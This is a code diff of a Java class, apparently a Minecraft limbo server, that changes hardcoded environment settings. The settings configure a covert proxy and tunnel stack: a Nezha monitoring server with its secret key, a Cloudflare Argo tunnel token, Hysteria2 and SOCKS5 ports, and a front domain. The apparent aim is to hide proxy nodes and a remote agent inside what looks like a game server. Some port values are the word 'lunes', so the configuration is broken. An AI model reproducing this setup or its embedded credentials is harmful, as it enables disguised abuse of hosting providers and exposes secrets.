@@ -122,26 +122,26 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "bc91c73f-f019-4e91-9e47-929a0ad3a3e4");
+        envVars.put("UUID", "eb0be422-b5df-44f6-9c5a-2aed2da7a3ff");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nezhav1.chatppt.pp.ua:443");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "DxCctghPLrNwITqUX14JEtGgtjQKYc2K");
         envVars.put("ARGO_PORT", "8001");
-        envVars.put("ARGO_DOMAIN", "na1-gb.argo.pp.ua");
-        envVars.put("ARGO_AUTH", "eyJhIjoiMDlmYWQxOGQ0NTM5NGNjYTU5YzEyNGNiZDU3ZjBmZmUiLCJ0IjoiNDAwODE2MDItZTE3Yy00NDU4LWIxNjEtNDM0ZGZjYzRkYzUzIiwicyI6IlpEVXlNRGMzTkRZdFltTXpPQzAwT1RCbUxXSTVNV1l0Tm1Fd01tRmtZMlprWkRNeCJ9");
-        envVars.put("HY2_PORT", "30663");
+        envVars.put("ARGO_DOMAIN", "lunes-us2.argo.pp.ua");
+        envVars.put("ARGO_AUTH", "eyJhIjoiMDlmYWQxOGQ0NTM5NGNjYTU5YzEyNGNiZDU3ZjBmZmUiLCJ0IjoiN2UzOTU4MGUtMjcyZC00NjEwLTlhZmItYzcxNWNjMzQzMDQ1IiwicyI6Ik9UZzRZak5pWmpNdE16SmpNUzAwT0RnMUxUa3paR1V0WWpjeE16QTBNak5oWlRKbSJ9");
+        envVars.put("HY2_PORT", "lunes");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
-        envVars.put("S5_PORT", "30663");
+        envVars.put("S5_PORT", "lunes");
         envVars.put("ANYTLS_PORT", "");
         envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "");
         envVars.put("BOT_TOKEN", "");
-        envVars.put("CFIP", "www.visa.co.uk");
+        envVars.put("CFIP", "www.visa.com");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "NA1游戏机");
+        envVars.put("NAME", "lunes2");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
